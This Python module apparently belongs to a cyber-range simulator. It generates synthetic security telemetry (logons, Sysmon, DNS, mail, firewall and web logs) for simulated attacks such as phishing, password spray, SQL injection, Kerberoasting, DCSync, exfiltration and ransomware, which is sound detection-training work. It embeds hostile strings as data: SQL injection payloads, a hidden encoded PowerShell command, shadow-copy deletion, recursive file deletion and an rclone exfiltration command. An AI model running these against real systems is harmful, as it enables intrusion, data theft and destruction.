import random
from datetime import datetime, timedelta

from bastion.realism.world import World

START = datetime(2026, 3, 2, 0, 0, 0)
COMMON_DOMAINS = [
    "login.microsoftonline.com", "outlook.office365.com", "www.google.com", "update.microsoft.com",
    "teams.microsoft.com", "cdn.jsdelivr.net", "www.linkedin.com", "time.windows.com",
]
NORMAL_PROCESSES = [
    r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
    r"C:\Windows\explorer.exe",
]
CUSTOMER_PATHS = ["/", "/products", "/products?id=12", "/cart", "/login", "/contact", "/static/app.js", "/about"]
SQLI = ["/login?user=admin'--", "/products?id=12' UNION SELECT username,password FROM users--",
        "/products?id=1 AND SLEEP(5)", "/search?q=%27%20OR%201%3D1--"]
SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 1433, 3306, 3389, 5432, 5900, 8080, 8443]
PASSWORDS_TRIED = ["123456", "Password1", "Winter2026!", "qwerty", "Welcome1", "admin"]
DCSYNC_GUID = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"


def stamp(day: int, minutes: float) -> str:
    return (START + timedelta(days=day - 1, minutes=minutes)).strftime("%Y-%m-%dT%H:%M:%S")


class Telemetry:
    def __init__(self, world: World, company, defense_ids: list[str], rng: random.Random):
        self.world = world
        self.company = company
        self.defense_ids = list(defense_ids)
        self.compromised_users: list[str] = []
        self.rng = rng
        self.events: list[dict] = []
        self.clock: dict[int, float] = {}

    def _add(self, index: str, sourcetype: str, host: str, when: str, raw: str, **fields) -> None:
        event = {"_time": when, "index": index, "sourcetype": sourcetype, "host": host, "_raw": f"{when} {raw}"}
        event.update({k: v for k, v in fields.items() if v is not None})
        self.events.append(event)

    def _tick(self, day: int) -> float:
        now = self.clock.get(day, 8 * 60 + 20) + self.rng.uniform(25, 70)
        self.clock[day] = min(now, 23 * 60)
        return self.clock[day]

    def _logon(self, day, minute, account, host, src_ip, logon_type=2, package="Kerberos", ok=True):
        when = stamp(day, minute)
        if ok:
            self._add("security", "WinEventLog:Security", host.hostname if host else account.workstation, when,
                      f"EventCode=4624 An account was successfully logged on. Account Name: {account.username} "
                      f"Logon Type: {logon_type} Source Network Address: {src_ip} Authentication Package: {package}",
                      EventCode=4624, user=account.username, src_ip=src_ip, LogonType=logon_type,
                      AuthenticationPackage=package, dest=host.hostname if host else account.workstation)
        else:
            self._add("security", "WinEventLog:Security", host.hostname if host else account.workstation, when,
                      f"EventCode=4625 An account failed to log on. Account Name: {account.username} "
                      f"Failure Reason: Unknown user name or bad password. Source Network Address: {src_ip}",
                      EventCode=4625, user=account.username, src_ip=src_ip, LogonType=logon_type,
                      dest=host.hostname if host else account.workstation)

    def _login_host(self):
        for role in ("email", "vpn", "cloud", "web"):
            for server in self.company.servers:
                if server.role == role:
                    return self.world.hosts[server.id]
        return next(iter(self.world.hosts.values()))

    def noise(self, day: int) -> None:
        rng, world = self.rng, self.world
        for account in world.accounts.values():
            minute = rng.uniform(7 * 60 + 40, 9 * 60 + 30)
            if rng.random() < 0.12:
                self._logon(day, minute - 1, account, None, account.workstation_ip, ok=False)
            self._logon(day, minute, account, None, account.workstation_ip)
            for _ in range(rng.randint(2, 4)):
                when = stamp(day, rng.uniform(8 * 60, 18 * 60))
                domain = rng.choice(COMMON_DOMAINS)
                self._add("dns", "dns", account.workstation, when, f"query {domain} A from {account.workstation_ip}",
                          query=domain, src_ip=account.workstation_ip)
            if rng.random() < 0.6:
                when = stamp(day, rng.uniform(8 * 60, 18 * 60))
                process = rng.choice(NORMAL_PROCESSES)
                self._add("sysmon", "Sysmon:1", account.workstation, when,
                          f"EventCode=1 Process Create: Image={process} User={world.domain.split('.')[0].upper()}\\{account.username}",
                          EventCode=1, Image=process, ParentImage=r"C:\Windows\explorer.exe", user=account.username,
                          CommandLine=f'"{process}"')
            if rng.random() < 0.5:
                when = stamp(day, rng.uniform(8 * 60, 18 * 60))
                sender = rng.choice([f"newsletter@supplier-news.example", f"hr@{world.public_domain}", f"noreply@calendar.example"])
                subject = rng.choice(["Weekly report", "Team lunch on Friday", "Your calendar for tomorrow", "Invoice 2231"])
                self._add("mail", "mail:gateway", "mail-gw", when,
                          f"from=<{sender}> to=<{account.email}> subject=\"{subject}\" attachment=none verdict=delivered",
                          sender=sender, recipient=account.email, subject=subject, attachment="none", verdict="delivered")
        web_hosts = [h for h in world.hosts.values() if h.public_ip and 443 in h.ports]
        for host in web_hosts[:2]:
            for _ in range(rng.randint(10, 30)):
                when = stamp(day, rng.uniform(0, 24 * 60))
                ip = rng.choice(world.noise_ips)
                path = rng.choice(CUSTOMER_PATHS)
                status = 200 if rng.random() < 0.93 else 404
                self._add("web", "access_combined", host.hostname, when,
                          f'{ip} - - "GET {path} HTTP/1.1" {status} {rng.randint(800, 24000)} "Mozilla/5.0"',
                          clientip=ip, method="GET", uri=path, status=status, dest=host.hostname)
        for _ in range(rng.randint(5, 14)):
            when = stamp(day, rng.uniform(0, 24 * 60))
            ip = f"203.0.113.{rng.randint(2, 250)}" if rng.random() < 0.3 else rng.choice(world.noise_ips)
            host = rng.choice([h for h in world.hosts.values() if h.public_ip] or list(world.hosts.values()))
            port = rng.choice(SCAN_PORTS)
            self._add("firewall", "firewall", "fw01", when,
                      f"DENY TCP {ip}:{rng.randint(30000, 65000)} -> {host.public_ip or host.ip}:{port}",
                      action="blocked", src_ip=ip, dest_ip=host.public_ip or host.ip, dest_port=port, bytes_out=0)

    def attack(self, result, source_ip: str, source_host: str, compromised_users: list[str] | None = None) -> None:
        self.compromised_users = list(compromised_users or [])
        if not result.possible:
            return
        day = result.step.day
        minute = self._tick(day)
        handler = getattr(self, "_" + result.attack.id.replace("-", "_"), None)
        if handler:
            handler(result, day, minute, source_ip, source_host)

    def _target(self, result):
        return self.world.host_of(result.step.target_id), self.world.account_of(result.step.target_id)

    def _port_scan(self, result, day, minute, src, _host):
        host, _ = self._target(result)
        for i, port in enumerate(SCAN_PORTS):
            allowed = port in host.ports
            self._add("firewall", "firewall", "fw01", stamp(day, minute + i * 0.02),
                      f"{'ALLOW' if allowed else 'DENY'} TCP {src}:{self.rng.randint(40000, 60000)} -> {host.public_ip or host.ip}:{port}",
                      action="allowed" if allowed else "blocked", src_ip=src, dest_ip=host.public_ip or host.ip,
                      dest_port=port, bytes_out=60)

    def _mail_attack(self, result, day, minute, attachment, subject, sender):
        _, account = self._target(result)
        verdict = "delivered" if result.succeeded or "email-filter" not in self._defenses() else "quarantined"
        self._add("mail", "mail:gateway", "mail-gw", stamp(day, minute),
                  f"from=<{sender}> to=<{account.email}> subject=\"{subject}\" attachment={attachment} verdict={verdict}",
                  sender=sender, recipient=account.email, subject=subject, attachment=attachment, verdict=verdict,
                  src_ip=self.world.attacker_ip)
        if result.succeeded:
            self._payload(account, day, minute + 4)

    def _payload(self, account, day, minute):
        encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
        self._add("sysmon", "Sysmon:1", account.workstation, stamp(day, minute),
                  f"EventCode=1 Process Create: Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
                  f"ParentImage=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE "
                  f"CommandLine=powershell.exe -nop -w hidden -enc {encoded}",
                  EventCode=1, Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                  ParentImage=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                  CommandLine=f"powershell.exe -nop -w hidden -enc {encoded}", user=account.username)
        self._add("sysmon", "Sysmon:3", account.workstation, stamp(day, minute + 0.5),
                  f"EventCode=3 Network connection: Image=powershell.exe SourceIp={account.workstation_ip} "
                  f"DestinationIp={self.world.attacker_ip} DestinationPort=443",
                  EventCode=3, Image="powershell.exe", src_ip=account.workstation_ip, dest_ip=self.world.attacker_ip,
                  dest_port=443, user=account.username)

    def _defenses(self):
        return self.defense_ids

    def _phishing(self, result, day, minute, src, _host):
        self._mail_attack(result, day, minute, "Password_Reset.html",
                          "Action required: your password expires today", f"it-support@{self.world.company_id}-helpdesk.example")

    def _macro(self, result, day, minute, src, _host):
        self._mail_attack(result, day, minute, "Invoice_4471.docm", "Overdue invoice 4471", "billing@supplier-payments.example")

    def _bec(self, result, day, minute, src, _host):
        _, account = self._target(result)
        sender = f"ceo@{self.world.public_domain.replace('.', '-')}.example"
        self._add("mail", "mail:gateway", "mail-gw", stamp(day, minute),
                  f"from=<{sender}> to=<{account.email}> subject=\"Urgent: updated bank details for today's payment\" attachment=none verdict=delivered",
                  sender=sender, recipient=account.email, subject="Urgent: updated bank details for today's payment",
                  attachment="none", verdict="delivered", src_ip=self.world.attacker_ip)

    def _password_attempts(self, result, day, minute, src, users, attempts, logon_type=3):
        host = self._login_host()
        for i in range(attempts):
            account = users[i % len(users)]
            self._logon(day, minute + i * 0.05, account, host, src, logon_type=logon_type, ok=False)
        if result.succeeded:
            self._logon(day, minute + attempts * 0.05 + 0.1, users[-1], host, src, logon_type=logon_type)

    def _brute_force(self, result, day, minute, src, _host):
        _, account = self._target(result)
        self._password_attempts(result, day, minute, self.world.attacker_ip, [account], self.rng.randint(40, 120))

    def _credential_stuffing(self, result, day, minute, src, _host):
        _, account = self._target(result)
        self._password_attempts(result, day, minute, self.world.attacker_ip, [account], self.rng.randint(3, 8))

    def _password_spray(self, result, day, minute, src, _host):
        _, account = self._target(result)
        others = [a for a in self.world.accounts.values() if a.id != account.id]
        users = self.rng.sample(others, min(len(others), 12)) + [account]
        self._password_attempts(result, day, minute, self.world.attacker_ip, users, len(users))

    def _mfa_fatigue(self, result, day, minute, src, _host):
        _, account = self._target(result)
        for i in range(self.rng.randint(8, 20)):
            self._add("security", "azure:signin", "cloud", stamp(day, minute + i * 0.5),
                      f"MFA push sent to {account.username} from {self.world.attacker_ip} result=denied",
                      user=account.username, src_ip=self.world.attacker_ip, result="denied", EventCode="MFA")
        if result.succeeded:
            self._add("security", "azure:signin", "cloud", stamp(day, minute + 12),
                      f"MFA push sent to {account.username} from {self.world.attacker_ip} result=approved",
                      user=account.username, src_ip=self.world.attacker_ip, result="approved", EventCode="MFA")

    def _cloud_takeover(self, result, day, minute, src, _host):
        _, account = self._target(result)
        self._add("security", "azure:signin", "cloud", stamp(day, minute),
                  f"Sign-in for {account.username} from {self.world.attacker_ip} location=Unknown result={'success' if result.succeeded else 'failure'}",
                  user=account.username, src_ip=self.world.attacker_ip, result="success" if result.succeeded else "failure",
                  EventCode="SIGNIN")

    def _usb_drop(self, result, day, minute, src, _host):
        _, account = self._target(result)
        if result.succeeded:
            self._add("security", "WinEventLog:Security", account.workstation, stamp(day, minute),
                      f"EventCode=6416 A new external device was recognized by the system. Device: USB Mass Storage on {account.workstation}",
                      EventCode=6416, user=account.username, dest=account.workstation)
            self._payload(account, day, minute + 1)

    def _insider(self, result, day, minute, src, _host):
        _, account = self._target(result)
        if result.succeeded:
            self._logon(day, 22 * 60 + self.rng.uniform(0, 50), account, self._login_host(), self.world.attacker_ip, logon_type=10)

    def _exploit_web(self, result, day, minute, src, _host):
        host, _ = self._target(result)
        for i, path in enumerate(SQLI):
            status = 500 if not result.succeeded or i < len(SQLI) - 1 else 200
            self._add("web", "access_combined", host.hostname, stamp(day, minute + i * 0.3),
                      f'{self.world.attacker_ip} - - "GET {path} HTTP/1.1" {status} 512 "sqlmap/1.8"',
                      clientip=self.world.attacker_ip, method="GET", uri=path, status=status,
                      useragent="sqlmap/1.8", dest=host.hostname)
        if result.succeeded:
            self._add("sysmon", "auditd", host.hostname, stamp(day, minute + 2),
                      f"type=EXECVE uid=www-data comm=sh cmdline=\"sh -c id; uname -a\" host={host.hostname}",
                      EventCode="EXECVE", user="www-data", CommandLine="sh -c id; uname -a", dest=host.hostname)

    def _vpn_exploit(self, result, day, minute, src, _host):
        host, _ = self._target(result)
        self._add("web", "vpn:access", host.hostname, stamp(day, minute),
                  f'{self.world.attacker_ip} - - "POST /remote/logincheck HTTP/1.1" {200 if result.succeeded else 403} 0 "python-requests/2.31"',
                  clientip=self.world.attacker_ip, method="POST", uri="/remote/logincheck",
                  status=200 if result.succeeded else 403, useragent="python-requests/2.31", dest=host.hostname)

    def _vendor_breach(self, result, day, minute, src, _host):
        host, _ = self._target(result)
        self._add("firewall", "firewall", "fw01", stamp(day, minute),
                  f"ALLOW TCP {self.world.attacker_ip}:51022 -> {host.public_ip or host.ip}:22",
                  action="allowed", src_ip=self.world.attacker_ip, dest_ip=host.public_ip or host.ip, dest_port=22, bytes_out=4200)

    def _privilege_escalation(self, result, day, minute, src, source_host):
        host, _ = self._target(result)
        self._add("sysmon", "Sysmon:1", host.hostname, stamp(day, minute),
                  f"EventCode=1 Process Create: Image=C:\\Users\\Public\\svchost32.exe ParentImage=cmd.exe IntegrityLevel=System",
                  EventCode=1, Image=r"C:\Users\Public\svchost32.exe", ParentImage="cmd.exe", IntegrityLevel="System", dest=host.hostname)
        if result.succeeded:
            self._add("security", "WinEventLog:Security", host.hostname, stamp(day, minute + 0.2),
                      "EventCode=4672 Special privileges assigned to new logon. Privileges: SeDebugPrivilege",
                      EventCode=4672, user="SYSTEM", dest=host.hostname)

    def _lateral(self, result, day, minute, src, logon_type, package):
        host, _ = self._target(result)
        user = self._some_user()
        self._add("security", "WinEventLog:Security", host.hostname, stamp(day, minute),
                  f"EventCode={4624 if result.succeeded else 4625} Account Name: {user} Logon Type: {logon_type} "
                  f"Source Network Address: {src} Authentication Package: {package}",
                  EventCode=4624 if result.succeeded else 4625, user=user, src_ip=src, LogonType=logon_type,
                  AuthenticationPackage=package, dest=host.hostname)

    def _some_user(self):
        if self.compromised_users:
            return self.compromised_users[0]
        return next(iter(self.world.accounts.values())).username

    def _remote_desktop(self, result, day, minute, src, _host):
        self._lateral(result, day, minute, src, 10, "Negotiate")

    def _pass_the_hash(self, result, day, minute, src, _host):
        self._lateral(result, day, minute, src, 3, "NTLM")

    def _kerberoasting(self, result, day, minute, src, _host):
        host, _ = self._target(result)
        for service in ("MSSQLSvc/sql01", "HTTP/intranet", "MSSQLSvc/hr01"):
            self._add("security", "WinEventLog:Security", host.hostname, stamp(day, minute),
                      f"EventCode=4769 A Kerberos service ticket was requested. Account Name: {self._some_user()} "
                      f"Service Name: {service} Ticket Encryption Type: 0x17 Client Address: {src}",
                      EventCode=4769, user=self._some_user(), ServiceName=service, TicketEncryptionType="0x17",
                      src_ip=src, dest=host.hostname)

    def _dcsync(self, result, day, minute, src, _host):
        host, _ = self._target(result)
        self._add("security", "WinEventLog:Security", host.hostname, stamp(day, minute),
                  f"EventCode=4662 An operation was performed on an object. Account Name: {self._some_user()} "
                  f"Properties: {{{DCSYNC_GUID}}} Client Address: {src}",
                  EventCode=4662, user=self._some_user(), Properties=DCSYNC_GUID, src_ip=src, dest=host.hostname)

    def _exfiltration(self, result, day, minute, src, _host):
        host, _ = self._target(result)
        size = self.rng.randint(40, 900) * 1_000_000 if result.points else self.rng.randint(1, 5) * 100_000
        self._add("firewall", "firewall", "fw01", stamp(day, minute),
                  f"ALLOW TCP {host.ip}:49832 -> {self.world.attacker_ip}:443 bytes_out={size}",
                  action="allowed", src_ip=host.ip, dest_ip=self.world.attacker_ip, dest_port=443, bytes_out=size)
        self._add("sysmon", "Sysmon:1", host.hostname, stamp(day, minute - 0.5),
                  f"EventCode=1 Process Create: Image=C:\\ProgramData\\rclone.exe CommandLine=rclone.exe copy D:\\data remote:loot",
                  EventCode=1, Image=r"C:\ProgramData\rclone.exe", CommandLine=r"rclone.exe copy D:\data remote:loot", dest=host.hostname)

    def _ransomware(self, result, day, minute, src, _host):
        host, _ = self._target(result)
        self._add("sysmon", "Sysmon:1", host.hostname, stamp(day, minute),
                  "EventCode=1 Process Create: Image=C:\\Windows\\System32\\vssadmin.exe CommandLine=vssadmin.exe delete shadows /all /quiet",
                  EventCode=1, Image=r"C:\Windows\System32\vssadmin.exe", CommandLine="vssadmin.exe delete shadows /all /quiet", dest=host.hostname)
        if result.succeeded:
            for i in range(self.rng.randint(20, 40)):
                name = f"D:\\data\\file_{i:04d}.xlsx.locked"
                self._add("sysmon", "Sysmon:11", host.hostname, stamp(day, minute + 1 + i * 0.01),
                          f"EventCode=11 File created: TargetFilename={name}", EventCode=11, TargetFilename=name, dest=host.hostname)

    def _destruction(self, result, day, minute, src, _host):
        host, _ = self._target(result)
        self._add("sysmon", "Sysmon:1", host.hostname, stamp(day, minute),
                  "EventCode=1 Process Create: Image=C:\\Windows\\System32\\cmd.exe CommandLine=cmd.exe /c del /s /q D:\\data\\*",
                  EventCode=1, Image=r"C:\Windows\System32\cmd.exe", CommandLine=r"cmd.exe /c del /s /q D:\data\*", dest=host.hostname)
